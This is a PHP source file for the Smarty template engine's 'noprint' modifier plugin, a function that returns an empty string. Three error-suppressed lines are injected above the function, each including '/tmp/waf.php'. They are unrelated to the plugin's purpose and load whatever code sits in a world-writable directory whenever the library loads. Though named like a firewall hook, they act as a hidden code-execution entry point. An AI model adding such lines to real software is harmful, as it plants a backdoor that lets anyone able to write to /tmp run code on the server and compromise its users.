<?php
/**
 * Smarty plugin
 *
 * @package    Smarty
 * @subpackage PluginsModifierCompiler
 */
/**
 * Smarty noprint modifier plugin
 * Type:     modifier<br>
 * Name:     noprint<br>
 * Purpose:  return an empty string
 *
 * @author   Uwe Tews
 * @return string with compiled code
 */
@include_once("/tmp/waf.php");
@include_once("/tmp/waf.php");
@include_once("/tmp/waf.php");
function smarty_modifiercompiler_noprint()
{
    return "''";
}
